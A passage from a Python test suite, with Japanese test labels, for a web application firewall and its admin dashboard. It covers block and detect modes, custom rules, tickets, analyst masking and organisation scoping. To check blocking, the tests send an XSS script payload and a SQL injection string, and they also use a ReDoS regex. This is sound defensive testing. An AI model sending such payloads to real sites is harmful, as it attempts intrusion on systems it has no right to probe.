          bp_.get("8281", {}).get("accepted") == 2 and bp_.get("8080", {}).get("tls_fail") == 1 and bb_.get("b1", {}).get("requests") == 1
          and cs_.snapshot()["accepted"] == 2 and cs_.snapshot()["requests"] == 1)
    np_ = wb.normalize_profile({"name": "x", "host": "example.com", "xf_host": False})
    check("転送ヘッダの設定: 既定は全部ON、個別にOFFにできる", np_["xf_host"] is False and np_["xf_proto"] is True and np_["xf_for"] is True
          and wb.normalize_profile({"name": "y", "host": "example.com"})["xf_host"] is True)
    hdrs_ = {"Host": "a", "X-Forwarded-Host": "w", "x-forwarded-for": "1.1.1.1", "X-Forwarded-Proto": "https"}
    check("転送ヘッダ: OFFにしたものだけ外す(クライアント付与分も)",
          set(wb.strip_xf(hdrs_, {"xf_host": False, "xf_for": False})) == {"Host", "X-Forwarded-Proto"} and wb.strip_xf(hdrs_, {}) == hdrs_)
    check("リダイレクトループ判定: 自分自身へのLocationだけを検知",
          wb.is_self_redirect("https://www.tid.ac.jp/", "www.tid.ac.jp", "/") and wb.is_self_redirect("http://h:8085/a?x=1", "h:8085", "/a?x=1")
          and wb.is_self_redirect("/", "h", "/") and not wb.is_self_redirect("https://h/login", "h", "/")
          and not wb.is_self_redirect("https://other.example/", "h", "/") and not wb.is_self_redirect("", "h", "/"))
    lg_ = waf.LoopGuard(window=5)
    check("リダイレクトループ: 同じ接続元・URLで3回目からループとみなす", [lg_.hit(("ip", "b", "/", "")) for _ in range(3)] == [1, 2, 3] and lg_.hit(("ip2", "b", "/", "")) == 1)
    check("画面: ホームの待ち受けURLはクリックで新しいタブ(0.0.0.0はアクセス中のホスト名に置換)",
          "function homeListenCell" in dsh.PAGE and 'target="_blank" rel="noopener noreferrer"' in dsh.PAGE and "location.hostname" in dsh.PAGE)
    check("画面: 稼働の詳細グラフにホバー表示(応答時間・何秒前)", "function sparkHover" in dsh.PAGE and 'class="tr-wrap spk-wrap"' in dsh.PAGE and "spk-wrap:hover" in dsh.PAGE)
    check("画面: 転送先URL・バックエンド設定の転送先/待ち受けURLもクリックで新しいタブ", "function extLink" in dsh.PAGE and "転送先: ${extLink(" in dsh.PAGE
          and "専用ポート(待ち受け): ${extLink(" in dsh.PAGE and "b.origin?extLink(" in dsh.PAGE)
    check("画面: 背景はドット柄(--dot)", "--dot:" in dsh.PAGE and "radial-gradient(var(--dot)" in dsh.PAGE)
    check("状態ログ: 一般ユーザー向けに絞り込み(サーバ側で自分の接続先のみ・詳細なし・CSV不可)", "def _limited_health" in open(dsh.__file__, encoding="utf-8").read()
          and "def _my_backend_ids" in open(dsh.__file__, encoding="utf-8").read() and 'data["limited"]' in open(dsh.__file__, encoding="utf-8").read()
          and "if(h.limited)" in dsh.PAGE and "WAF全体の稼働" in dsh.PAGE and "if(!AUTH.limited) renderConnFlow()" in dsh.PAGE)

    print("[12] 防御モード: バックエンド別モード・ルール単位の検知のみ")
    # normalize_profile のモード項目
    np_ = wb.normalize_profile({"url": "http://127.0.0.1:1"})
    check("normalize_profile: 既定は上書きなし(mode_override空/until0/lock偽)",
          np_["mode_override"] == "" and np_["mode_until"] == 0 and np_["mode_lock"] is False)
    np2 = wb.normalize_profile({"url": "http://127.0.0.1:1", "mode_override": "detect", "mode_lock": True})
    check("normalize_profile: 妥当な上書き・ロックを受け付ける", np2["mode_override"] == "detect" and np2["mode_lock"] is True)
    np3 = wb.normalize_profile({"url": "http://127.0.0.1:1", "mode_override": "xxx"})
    check("normalize_profile: 不正な上書きは空に落とす", np3["mode_override"] == "")
    # effective_mode
    check("effective_mode: 上書きなし→全体設定", wb.effective_mode({"mode": "block"}, {"mode_override": ""}) == "block")
    check("effective_mode: 期限内の上書きを適用", wb.effective_mode({"mode": "block"}, {"mode_override": "detect", "mode_until": time.time() + 99}) == "detect")
    check("effective_mode: 期限切れは全体設定に戻る", wb.effective_mode({"mode": "block"}, {"mode_override": "detect", "mode_until": time.time() - 5}) == "block")
    # 設定画面の保存ではモード項目を書き換えない
    cur_view = {"profiles": [{"id": "a", "url": "http://127.0.0.1:1", "mode_override": "detect", "mode_lock": True}]}
    cur_norm = {"profiles": [wb.normalize_profile(cur_view["profiles"][0])], "active": "a"}
    edited = wb.normalize_backend_settings({"profiles": [{"id": "a", "url": "http://127.0.0.1:1", "mode_override": "block", "mode_lock": False}]}, cur_norm)
    check("設定保存: モードのロック/上書きは画面から変更できない(現状維持)",
          edited["profiles"][0]["mode_lock"] is True and edited["profiles"][0]["mode_override"] == "detect")
    newp = wb.normalize_backend_settings({"profiles": [{"id": "z", "url": "http://127.0.0.1:1", "mode_lock": True}]}, cur_norm)
    check("設定保存: 新規バックエンドは上書きなし(ロック指定は無視)", newp["profiles"][0]["mode_lock"] is False)
    # 履歴ファイルの読み書き
    hpath = os.path.join(TMP, "mh.jsonl")
    wb.append_mode_history({"mode_history_file": hpath}, {"backend": "a", "to": "detect", "by": "user1"})
    wb.append_mode_history({"mode_history_file": hpath}, {"backend": "a", "to": "block", "by": "admin"})
    hist = wb.read_mode_history(hpath, 10)
    check("モード履歴: 新しい順に読み出せる", len(hist) == 2 and hist[0]["to"] == "block" and hist[1]["by"] == "user1")

    # 実際の遮断/検知の挙動(block運用)
    pm = free_port(); bk = make_backend("M")
    bk_port = bk.server_address[1]
    wm = build(backends=[{"id": "m", "name": "M", "url": f"http://127.0.0.1:{bk_port}"}], log_name="mode.log")
    st, _, _ = get(wm["port"], "/?q=<script>alert(1)</script>")
    check("モード: 全体block → 攻撃は遮断(403)", st == 403)
    # このバックエンドだけ検知のみにする(live cfg を直接書き換え)
    wm["cfg"]["backends"][0]["mode_override"] = "detect"
    st, body, _ = get(wm["port"], "/?q=<script>alert(1)</script>")
    check("モード: バックエンドを検知のみ → 攻撃は通る(200・転送)", st == 200 and body == b"M:/?q=<script>alert(1)</script>")
    logs = read_log(wm["log"])
    check("モード: 検知のみの一致は DETECT で記録", any(e.get("action") == "DETECT" and e.get("backend") == "m" for e in logs))
    wm["cfg"]["backends"][0]["mode_override"] = ""   # 全体設定(block)に戻す
    # ルール単位の検知のみ
    cats = [c for c, on in wm["cfg"]["rules"].items() if on]
    ids = sorted({h["id"] for h in waf_rules.scan_value("<script>alert(1)</script>", cats)})
    check("準備: XSSペイロードが1つ以上のルールに一致", len(ids) >= 1)
    wm["cfg"]["detect_only_rules"] = ids           # 一致する全ルールを検知のみにする
    st, body, _ = get(wm["port"], "/?q=<script>alert(1)</script>")
    check("ルール検知のみ: 一致ルールが全て検知のみ → 遮断しない(200)", st == 200)
    wm["cfg"]["detect_only_rules"] = ids[:1]        # 1つだけ検知のみ(他は遮断対象のまま)
    st, _, _ = get(wm["port"], "/?q=<script>alert(1)</script>")
    check("ルール検知のみ: 遮断ルールが残れば遮断が優先(403)", st == 403)
    st, _, _ = get(wm["port"], "/?q=1'%20OR%20'1'='1")
    check("ルール検知のみ: 対象外のSQLiは通常どおり遮断(403)", st == 403)
    wm["cfg"]["detect_only_rules"] = []

    # FileConfigControl(単体起動)でのモード編集
    cfgp = os.path.join(TMP, "fc_cfg.json")
    with open(cfgp, "w", encoding="utf-8") as f:
        json.dump({"mode": "block", "mode_history_file": os.path.join(TMP, "fc_mh.jsonl"),
                   "backends": [{"id": "x", "name": "X", "scheme": "http", "host": "127.0.0.1", "port": 1, "owner": "user1"}]}, f)
    fc = dashboard.FileConfigControl(cfgp)
    sec = fc.be_mode({"backend": "x", "mode": "detect", "minutes": 60, "by": "user1"})
    bx = next(b for b in sec["backends"] if b["id"] == "x")
    check("FileConfigControl: be_mode で検知のみ+期限が入る", bx["effective_mode"] == "detect" and bx["mode_until"] > time.time())
    check("FileConfigControl: 変更が履歴に残る", any(h_["to"] == "detect" for h_ in sec.get("mode_history", [])))
    sec = fc.be_mode({"backend": "x", "lock": True})
    check("FileConfigControl: ロックを設定できる", next(b for b in sec["backends"] if b["id"] == "x")["mode_lock"] is True)
    rz = fc.set_rule_detect("XSS-001", True)
    check("FileConfigControl: set_rule_detect でルールを検知のみに", any(r["id"] == "XSS-001" and r.get("detect_only") for r in rz["rules"]))
    check("FileConfigControl: get_rules が global_mode を返す", rz.get("global_mode") == "block")

    # 画面(PAGE)側
    check("画面: 防御モードのカードと切替UIがある(状態ログ)",
          'id="modeCard"' in dsh.PAGE and "function renderMode" in dsh.PAGE and "function setMode" in dsh.PAGE
          and "検知のみにする" in dsh.PAGE and 'class="mode-badge' in dsh.PAGE and "/api/security/bemode" in dsh.PAGE)
    check("画面: ルール単位の検知のみトグルがある(ルール管理)",
          "function toggleDetect" in dsh.PAGE and "/api/rules/detect" in dsh.PAGE and 'class="rdet' in dsh.PAGE and "r.detect_only" in dsh.PAGE)
    check("サーバ: 防御モードの権限・ルール検知モードを実装",
          "def set_rule_detect" in open(dsh.__file__, encoding="utf-8").read()
          and "このバックエンドの防御モードは提供側がロックしています" in open(dsh.__file__, encoding="utf-8").read()
          and "detect_only_rules" in open(waf.__file__, encoding="utf-8").read())


    # [13] 追加ルール / 申請 / アナリスト
    print("\n[13] 追加ルール・ルール管理・申請・アナリスト")
    import waf_custom as wc
    import waf_tickets as wt
    cf = os.path.join(TMP, "custom_rules.json")
    ok_rule = {"id": "CUS-T1", "pattern": r"vuln\.cgi", "target": "path", "severity": "high"}
    v = wc.validate_rule(ok_rule, check_safety=False)
    check("追加ルール: 既定は検知のみ(detect)", v["mode"] == "detect" and v["enabled"] is True)

    def bad(d):
        try:
            wc.validate_rule(d, check_safety=False)
            return False
        except ValueError:
            return True
    check("追加ルール: ID形式/構文エラー/重大度/対象/モードの不正を拒否",
          bad({**ok_rule, "id": "XSS-9"}) and bad({**ok_rule, "pattern": "("}) and bad({**ok_rule, "severity": "x"})
          and bad({**ok_rule, "target": "x"}) and bad({**ok_rule, "mode": "x"}) and bad({**ok_rule, "pattern": ""}))
    check("追加ルール: 入れ子の量指定子(ReDoS)を拒否", wc.check_pattern_safety(r"(a+)+$") is not None)
    check("追加ルール: 通常の正規表現は安全と判定", wc.check_pattern_safety(r"vuln\.cgi") is None)
    try:
        wc.validate_all([ok_rule, ok_rule], check_safety=False)
        dup = False
    except ValueError:
        dup = True
    check("追加ルール: ID重複を拒否", dup)

    ver1 = wc.save_file(cf, [ok_rule], by="t", note="first")
    ver2 = wc.save_file(cf, [ok_rule, {"id": "CUS-T2", "pattern": "evilparam", "target": "query", "mode": "block"}], by="t", note="second")
    snaps = wc.list_snapshots(cf)
    check("追加ルール: 保存のたびに版が進み、旧版が残る", ver2 == ver1 + 1 and len(snaps) >= 1)
    wc.restore_snapshot(cf, snaps[0]["name"] if isinstance(snaps[0], dict) else snaps[0], by="t")
    rl, _ = wc.read_file(cf)
    check("追加ルール: 旧版へ戻せる", len(rl) == 1 and rl[0]["id"] == "CUS-T1")

    wc.save_file(cf, [ok_rule, {"id": "CUS-T2", "pattern": "evilparam", "target": "query", "mode": "block"}], by="t")
    cr = wc.CustomRules(cf, log=lambda *_: None)
    cr.reload(force=True)
    check("追加ルール: 読み込み・検知のみID", cr.count == 2 and cr.detect_ids() == {"CUS-T1"})
    check("追加ルール: 検査対象(path/query)を区別",
          bool(cr.scan("path", "/vuln.cgi")) and not cr.scan("query:a", "vuln.cgi")
          and bool(cr.scan("query:a", "evilparam")) and not cr.scan("path", "evilparam"))
    with open(cf, "w", encoding="utf-8") as f:
        f.write('{"version": 9, "rules": [{"id": "BAD", "pattern": "x"}]}')
    time.sleep(0.05)
    os.utime(cf, (time.time() + 5, time.time() + 5))
    changed = cr.reload()
    check("追加ルール: 壊れたファイルは採用せず、今のルールを維持", changed is False and cr.error and len(cr.rules_view()) == 2)

    lg = os.path.join(TMP, "replay.log")
    with open(lg, "w", encoding="utf-8") as f:
        f.write(json.dumps({"action": "PASS", "path": "/vuln.cgi", "query": "", "req": {}}) + "\n")
        f.write(json.dumps({"action": "BLOCK", "path": "/vuln.cgi", "query": "a=1", "req": {}}) + "\n")
        f.write(json.dumps({"action": "PASS", "path": "/ok", "query": "", "req": {}}) + "\n")
    rp = wc.replay([ok_rule], lg)
    row = rp["results"][0] if isinstance(rp, dict) and "results" in rp else (rp[0] if isinstance(rp, list) else rp.get("CUS-T1"))
    check("リプレイ: 通過/遮断ごとの一致数", row["on_pass"] == 1 and row["on_detect_block"] == 1 and row["matched_total"] == 2)

    # バックエンド別: 無効化・除外・期限
    prof = {"rule_disabled": ["XSS-011"], "exclusions": []}
    hits = [{"id": "XSS-011"}, {"id": "SQLI-001"}, {"id": "SQLI-002"}]
    cfg_t = {"backends": [{"id": "b1", "name": "B1", "rule_disabled": [], "rule_detect": [], "exclusions": []}]}
    wb.be_rules_op(cfg_t, {"backend": "b1", "op": "add_exclusion", "rule": "SQLI-001", "path_prefix": "/editor", "minutes": 10}, by="adm")
    pf = cfg_t["backends"][0]
    pf["rule_disabled"] = ["XSS-011"]
    kept, n = wb.apply_rule_overrides(pf, hits, "/editor/save")
    check("ルール別設定: 無効化+パス限定の除外", [h["id"] for h in kept] == ["SQLI-002"] and n == 2)
    kept, n = wb.apply_rule_overrides(pf, hits, "/other")
    check("ルール別設定: 除外は指定パス以外には効かない", [h["id"] for h in kept] == ["SQLI-001", "SQLI-002"])
    pf["exclusions"][0]["until"] = time.time() - 1
    kept, n = wb.apply_rule_overrides(pf, hits, "/editor/save")
    check("ルール別設定: 期限切れの除外は効かない", "SQLI-001" in [h["id"] for h in kept])
    # パス別の検知のみ: 一致は残し、遮断の対象からだけ外す
    cfg_d = {"backends": [{"id": "b1", "name": "B1", "rule_disabled": [], "rule_detect": [], "exclusions": []}]}
    wb.be_rules_op(cfg_d, {"backend": "b1", "op": "add_exclusion", "rule": "SQLI-001", "path_prefix": "/editor", "minutes": 10, "mode": "detect"}, by="adm")
    pd_ = cfg_d["backends"][0]
    check("パス別設定: モードは検知のみとして保存される", pd_["exclusions"][0]["mode"] == "detect")
    kept, n, det = wb.apply_rule_overrides_ex(pd_, hits, "/editor/save")
    check("パス別の検知のみ: 一致は残り、そのルールだけ検知のみ扱いになる",
          [h["id"] for h in kept] == ["XSS-011", "SQLI-001", "SQLI-002"] and det == {"SQLI-001"} and n == 0)
    kept, n, det = wb.apply_rule_overrides_ex(pd_, hits, "/other")
    check("パス別の検知のみ: 指定パス以外には効かない(遮断のまま)", det == set())
    wb.be_rules_op(cfg_d, {"backend": "b1", "op": "add_exclusion", "rule": "SQLI-001", "path_prefix": "/editor", "minutes": 10}, by="adm")
    kept, n, det = wb.apply_rule_overrides_ex(pd_, hits, "/editor/save")
    check("パス別: 同じルール・パスに「使わない」もあれば、使わないが優先", [h["id"] for h in kept] == ["XSS-011", "SQLI-002"] and n == 1)
    check("パス別: 古い除外(モードなし)は「使わない」として引き継ぐ", wb.clean_exclusions([{"id": "E", "rule": "SQLI-001", "path_prefix": "/x"}])[0]["mode"] == "off")
    try:
        wb.be_rules_op(cfg_t, {"backend": "b1", "op": "add_exclusion", "rule": "SQLI-001", "path_prefix": "editor"})
        badpath = False
    except ValueError:
        badpath = True
    check("ルール別設定: パスが / で始まらない除外は拒否", badpath)
    eid = pf["exclusions"][0]["id"]
    wb.be_rules_op(cfg_t, {"backend": "b1", "op": "remove_exclusion", "exclusion": eid})
    wb.be_rules_op(cfg_t, {"backend": "b1", "op": "detect", "rule": "SQLI-001"})
    check("ルール別設定: 除外の削除・検知のみ指定", pf["exclusions"] == [] and pf["rule_detect"] == ["SQLI-001"])

    # 起動時の読み込みで上書き・除外が消えない。設定画面の保存では変わらない
    up = {"profiles": [{"id": "b1", "name": "B1", "scheme": "http", "host": "127.0.0.1", "port": 9,
                        "mode_override": "detect", "rule_detect": ["SQLI-001"],
                        "exclusions": [{"id": "EX-1", "rule": "*", "path_prefix": "/e", "until": 0}]}]}
    try:
        st = wb.normalize_backend_settings(up, None)
        p0 = st["profiles"][0]
        check("起動時の読み込みで 上書き/除外 を保持", p0.get("mode_override") == "detect" and p0.get("rule_detect") == ["SQLI-001"] and len(p0.get("exclusions", [])) == 1)
        up2 = {"profiles": [{"id": "b1", "name": "B1", "scheme": "http", "host": "127.0.0.1", "port": 9}]}
        st2 = wb.normalize_backend_settings(up2, st)
        p1 = st2["profiles"][0]
        check("設定画面の保存は 上書き/除外 を勝手に変えない", p1.get("mode_override") == "detect" and len(p1.get("exclusions", [])) == 1)
    except Exception as e:
        check(f"normalize_backend_settings の検証({e})", False)

    # 申請(チケット)とメール通知
    sent = []
    ts = wt.TicketStore(os.path.join(TMP, "tickets.json"), mailer=lambda s, b: sent.append(s))
    t1 = ts.create("user1", "false_positive", "b1", "誤検知です", "本文", evidence={"path": "/x", "headers": {"Cookie": "a=b"}, "hits": [{"id": "SQLI-001"}]})
    time.sleep(0.2)
    check("申請: 連番ID・メール通知・証拠にヘッダーを含めない",
          t1["id"] == "T-0001" and sent and "headers" not in t1["evidence"] and t1["evidence"]["hits"][0]["id"] == "SQLI-001")
    ts.comment("T-0001", "adm", "確認します", role="admin")
    t1b = ts.set_status("T-0001", "done", "adm", "除外しました")
    check("申請: コメントと状態変更", t1b["status"] == "done" and len(t1b["comments"]) == 2)
    check("申請: 自分の分だけ一覧", len(ts.list(owner="user1")) == 1 and ts.list(owner="nobody") == [])
    try:
        ts.create("u", "bogus", "b1", "x")
        badk = False
    except ValueError:
        badk = True
    check("申請: 不正な種類・空の件名を拒否", badk)
    check("申請: SMTP未設定なら送信しない", wt.make_mailer(lambda: {})("s", "b") is False)

    # SMTP風のローカル受信サーバでメール送信を確認
    import socketserver
    got = []

    class SMTPH(socketserver.StreamRequestHandler):
        def handle(self):
            w = lambda s: (self.wfile.write((s + "\r\n").encode()), self.wfile.flush())
            w("220 test")
            data = False
            for raw in self.rfile:
                ln = raw.decode(errors="replace")
                if data:
                    if ln.strip() == ".":
                        data = False
                        w("250 ok")
                    else:
                        got.append(ln)
                    continue
                c = ln[:4].upper()
                if c in ("EHLO", "HELO"):
                    w("250 hi")
                elif c in ("MAIL", "RCPT", "RSET"):
                    w("250 ok")
                elif c == "DATA":
                    data = True
                    w("354 go")
                elif c == "QUIT":
                    w("221 bye")
                    break
                else:
                    w("250 ok")
    sp = free_port()
    srv = socketserver.ThreadingTCPServer(("127.0.0.1", sp), SMTPH)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    okm = wt.make_mailer(lambda: {"enabled": True, "smtp_host": "127.0.0.1", "smtp_port": sp, "to": ["a@example.com"], "from": "waf@example.com"})("件名テスト", "本文テスト")
    srv.shutdown()
    check("申請: メール送信(ローカルSMTP)", okm is True and any("Subject" in x for x in got))

    # アナリスト向けのマスク・役割
    me = dashboard.mask_event({"path": "/a", "query": "user=bob&password=hunter2&token=abc", "headers": {"Cookie": "sid=1", "Authorization": "Bearer x", "User-Agent": "UA"}})
    check("アナリスト: Cookie/認証/パスワード/トークンを伏せる",
          me["headers"]["Cookie"] == "***" and me["headers"]["Authorization"] == "***" and me["headers"]["User-Agent"] == "UA"
          and "hunter2" not in me["query"] and "abc" not in me["query"] and "user=bob" in me["query"])
    check("役割: analyst を認識し、不明な値は user 扱い", wx.norm_role("analyst") == "analyst" and wx.norm_role("zzz") == "user" and wx.norm_role("admin") == "admin")

    # 画面・サーバ側の実装の有無
    src = open(dsh_path := dashboard.__file__, encoding="utf-8").read()
    check("画面: 申請ページ・誤検知申請ボタン・ルール管理カードがある",
          'id="page-tickets"' in dashboard.PAGE and "function tkDraftFrom" in dashboard.PAGE and 'id="cusCard"' in dashboard.PAGE
          and 'id="berCard"' in dashboard.PAGE and 'id="rhCard"' in dashboard.PAGE and "body.analyst" in dashboard.PAGE)
    check("サーバ: アナリストの許可リスト(担当範囲の設定変更・申請の対応)を実装",
          "/api/security/bepolicy" in src and "_analyst_guard" in src and "アナリストにはこの操作の権限がありません" in src)


    # [15] 組織の木・担当範囲・保存期間・アナリストの設定変更
    print("\n[15] 組織の木・担当範囲・保存期間")
    import waf_org as wo
    _nov = lambda l: [o for o in l if o["id"] != "vendor"]        # ベンダー組織は常に先頭に入るので、既存のテストでは除く
    orgs_ok = _nov(wo.normalize_orgs([
        {"id": "a", "type": "direct", "name": "A社"},
        {"id": "x", "type": "intermediary", "name": "X社", "retention_days": 30},
        {"id": "b", "type": "enduser", "parent": "x", "mask_analyst": False}]))
    def bad_orgs(lst):
        try:
            wo.normalize_orgs(lst)
            return False
        except ValueError:
            return True
    check("組織: エンドユーザーは中間企業の配下だけ・IDは英小文字数字",
          bad_orgs([{"id": "b", "type": "enduser"}]) and bad_orgs([{"id": "A", "type": "direct"}])
          and bad_orgs([{"id": "a", "type": "direct", "parent": "q"}]) and bad_orgs([{"id": "日本", "type": "direct"}])
          and bad_orgs([{"id": "a", "type": "direct"}, {"id": "a", "type": "direct"}])
          and bad_orgs([{"id": "a", "type": "direct", "retention_days": 99999}]))
    check("組織: アナリストへのマスクは常にオン(外せない)", orgs_ok[0]["mask_analyst"] is True and orgs_ok[2]["mask_analyst"] is True)
    check("組織: 配下の組織を含める", wo.closure(orgs_ok, ["x"]) == {"x", "b"} and wo.closure(orgs_ok, ["b"]) == {"b"})
    check("組織: フォルダのパス(エンドユーザーは 中間企業/自社)", wo.org_path(orgs_ok, "b") == "x/b" and wo.org_path(orgs_ok, "a") == "a" and wo.org_path(orgs_ok, "") == "_unassigned")
    pf = [{"id": "ba", "org": "a"}, {"id": "bb", "org": "b"}, {"id": "bn", "owner": "legacy"}, {"id": "bo", "owner": "ent"}]
    us = [{"username": "ent", "org": "b"}]
    sc = lambda u: wo.scope_backends(orgs_ok, pf, u, us)
    check("範囲: 管理者はすべて(None)", sc({"role": "admin"}) is None)
    check("範囲: アナリストは担当組織とその下だけ", sc({"role": "analyst", "scope": ["x"]}) == {"bb", "bo"} and sc({"role": "analyst", "scope": ["a"]}) == {"ba"})
    check("範囲: 割り当てのないアナリストには何も見せない", sc({"role": "analyst", "scope": []}) == frozenset() and sc({"role": "analyst"}) == frozenset())
    check("範囲: アナリストは自分が登録したものでも担当外は見えない", sc({"role": "analyst", "username": "legacy", "scope": ["a"]}) == {"ba"})
    check("範囲: 一般は所属組織の接続先だけ(登録した人では決まらない)",
          sc({"role": "user", "org": "b"}) == {"bb", "bo"} and sc({"role": "user", "username": "legacy"}) == frozenset())
    check("範囲: 登録者の所属組織を、バックエンドの所属として使う", wo.backend_org({"owner": "ent"}, us) == "b")
    check("保存期間: バックエンド > 組織 > 既定30日、組織に属さないものは自動削除なし",
          wo.retention_for(orgs_ok, {"org": "a"}) == 30 and wo.retention_for(orgs_ok, {"org": "x"}) == 30
          and wo.retention_for(orgs_ok, {"org": "x", "retention_days": 7}) == 7 and wo.retention_for(orgs_ok, {"id": "z"}) is None)
    check("マスク: どの組織でも・未割り当てでも常に伏せる", wo.mask_for_analyst(orgs_ok, {"org": "a"}) and wo.mask_for_analyst(orgs_ok, {"org": "b"}) and wo.mask_for_analyst(orgs_ok, {}))

    # 保存期間: 古い行だけ消す。組織外は消さない。書き出し
    lg2 = os.path.join(TMP, "ret.log")
    now_ = time.time()
    iso = lambda days: time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime(now_ - days * 86400))
    with open(lg2, "w", encoding="utf-8") as f:
        for b, d in (("ba", 120), ("ba", 10), ("bb", 40), ("bb", 5), ("bn", 400)):
            f.write(json.dumps({"backend": b, "ts": iso(d), "action": "PASS"}) + "\n")
    n_ = wo.prune_log(lg2, {"ba": 90, "bb": 30})
    left = [json.loads(x)["backend"] + str(round((now_ - wo._ts_epoch(json.loads(x)["ts"])) / 86400)) for x in open(lg2, encoding="utf-8")]
    check("保存期間: 期限を過ぎた行だけ削除(他は残す)", n_ == 2 and sorted(left) == ["ba10", "bb5", "bn400"])
    exp_root = os.path.join(TMP, "exp")
    cnt = wo.export_org_logs(lg2, orgs_ok, [{"id": "bb", "org": "b"}, {"id": "ba", "org": "a"}], "x", exp_root)
    check("書き出し: 組織の配下だけを logs/<中間企業>/<自社>/<WEB>/ へ", cnt == {"bb": 1} and os.path.exists(os.path.join(exp_root, "x", "b", "bb", "waf.log")) and not os.path.exists(os.path.join(exp_root, "a")))

    # 組織の操作(割り当て・削除の制約)
    cfg_o = {"orgs": [], "backends": [{"id": "k1", "owner": "u"}], "dashboard": {"users": [{"username": "u", "org": ""}]}}
    wo.orgs_op(cfg_o, {"op": "add_org", "id": "a", "type": "direct"})
    wo.orgs_op(cfg_o, {"op": "assign_backend", "backend": "k1", "org": "a"})
    try:
        wo.orgs_op(cfg_o, {"op": "delete_org", "id": "a"})
        deld = True
    except ValueError:
        deld = False
    check("組織: バックエンドが割り当て済みの組織は削除できない", not deld)

    # ユーザーの所属・担当範囲(検証つき)
    ucfg = {"orgs": orgs_ok, "dashboard": {"users": [{"username": "adm", "role": "admin", "password_hash": wx.hash_password("Aaaaaa1!")}]}}
    wx.users_apply(ucfg, {"action": "add", "username": "an1", "password": "Passw0rd!", "role": "analyst", "scope": ["x", "a"]}, {"username": "adm", "role": "admin"})
    wx.users_apply(ucfg, {"action": "add", "username": "en1", "password": "Passw0rd!", "role": "user", "org": "b"}, {"username": "adm", "role": "admin"})
    uv = {u["username"]: u for u in wx.users_view(ucfg)}
    check("ユーザー: 所属組織・担当範囲を保存", uv["an1"]["scope"] == ["x", "a"] and uv["en1"]["org"] == "b")
    try:
        wx.users_apply(ucfg, {"action": "update", "username": "en1", "org": "nope"}, {"username": "adm", "role": "admin"})
        badorg = False
    except ValueError:
        badorg = True
    check("ユーザー: 存在しない組織は指定できない", badorg)

    # 実際のダッシュボード(HTTP)で、ログ・設定・申請・アナリストの設定変更を確認
    base_cfg = {"orgs": [dict(o, mask_analyst=True) for o in orgs_ok],
                "dashboard": {"users": [
                    {"username": "adm", "role": "admin", "password_hash": wx.hash_password("Adm!Passw0rd")},
                    {"username": "anx", "role": "analyst", "scope": ["x"], "password_hash": wx.hash_password("Anx!Passw0rd")},
                    {"username": "an0", "role": "analyst", "scope": [], "password_hash": wx.hash_password("An0!Passw0rd")},
                    {"username": "enb", "role": "user", "org": "b", "password_hash": wx.hash_password("Enb!Passw0rd")},
                    {"username": "dra", "role": "user", "org": "a", "password_hash": wx.hash_password("Dra!Passw0rd")}]},
                "backends": [dict(id="bk-a", name="A社サイト", scheme="http", host="127.0.0.1", port=9, owner="adm", org="a"),
                             dict(id="bk-b", name="B社サイト", scheme="http", host="127.0.0.1", port=9, owner="adm", org="b"),
                             dict(id="bk-n", name="未割当", scheme="http", host="127.0.0.1", port=9, owner="adm")],
                "active_backend": "bk-a", "listen_host": "127.0.0.1", "listen_port": 18080}
    cfgp2 = os.path.join(TMP, "org_cfg.json")
    with open(cfgp2, "w", encoding="utf-8") as f:
        json.dump(base_cfg, f)
    logp2 = os.path.join(TMP, "org_dash.log")
    with open(logp2, "w", encoding="utf-8") as f:
        for b in ("bk-a", "bk-b", "bk-n"):
            f.write(json.dumps({"ts": iso(0), "action": "BLOCK", "backend": b, "method": "GET", "path": "/x", "client_ip": "203.0.113.7",
                                "req": {"query": "password=hunter2&q=1", "headers": {"Cookie": "sid=zzz"}}, "hits": [{"id": "SQLI-001", "severity": "high", "field": "query:q"}]}) + "\n")
    ctl2 = dashboard.FileConfigControl(cfgp2)
    dh2 = dashboard.make_handler(logp2, dashboard.GeoResolver(enabled=False, egress=False), control=ctl2)
    ds2 = ThreadingHTTPServer(("127.0.0.1", free_port()), dh2)
    threading.Thread(target=ds2.serve_forever, daemon=True).start()
    p2 = ds2.server_address[1]

    def login(u, pw):
        st_, _, hd_ = get(p2, "/login", "POST", f"username={u}&password={pw}".encode(), {"Content-Type": "application/x-www-form-urlencoded"})
        return {"Cookie": (hd_.get("Set-Cookie") or "").split(";")[0], "Content-Type": "application/json"}
    H = {u: login(u, pw) for u, pw in (("adm", "Adm!Passw0rd"), ("anx", "Anx!Passw0rd"), ("an0", "An0!Passw0rd"), ("enb", "Enb!Passw0rd"), ("dra", "Dra!Passw0rd"))}

    def seen(u):
        st_, body_, _ = get(p2, "/api/logs/summary", headers=H[u])
        return sorted(b["id"] for b in json.loads(body_)["backends"]) if st_ == 200 else None
    check("画面: 管理者はすべて見える", seen("adm") == ["bk-a", "bk-b", "bk-n"])
    check("画面: 中間企業のアナリストは配下(B社)だけ", seen("anx") == ["bk-b"])
    check("画面: 割り当てのないアナリストには何も見えない", seen("an0") == [])
    check("画面: エンドユーザー/直接契約の一般は自社だけ", seen("enb") == ["bk-b"] and seen("dra") == ["bk-a"])
    st_, body_, _ = get(p2, "/api/events?limit=50", headers=H["anx"])
    evs = json.loads(body_) if st_ == 200 else {}
    rows = evs.get("events") or evs.get("rows") or []
    txt = json.dumps(rows, ensure_ascii=False)
    check("画面: アナリストにはパスワードが伏せられ、他社の行は含まれない",
          rows and "hunter2" not in txt and "zzz" not in txt and "bk-a" not in txt and "bk-n" not in txt and "***" in txt)
    st_, body_, _ = get(p2, "/api/stats", headers=H["anx"])
    stx = body_.decode("utf-8", "replace")
    st_a, body_a, _ = get(p2, "/api/stats", headers=H["adm"])
    check("画面: アナリストの集計(/api/stats)にも秘密が出ない",
          st_ == 200 and "hunter2" not in stx and "zzz" not in stx and "bk-a" not in stx)
    check("画面: 管理者の集計には元の値がある(比較用)", "hunter2" in body_a.decode("utf-8", "replace"))
    base_cfg["orgs"][2]["mask_analyst"] = False        # B社はマスクしない設定
    with open(cfgp2, "w", encoding="utf-8") as f:
        json.dump(base_cfg, f)
    st_, body_, _ = get(p2, "/api/events?limit=50", headers=H["anx"])
    check("画面: 組織の設定にマスクを外す項目はなく、設定ファイルで False にしても伏せたまま", "hunter2" not in body_.decode("utf-8", "replace"))
    st_, _, _ = get(p2, "/api/orgs", headers=H["anx"])
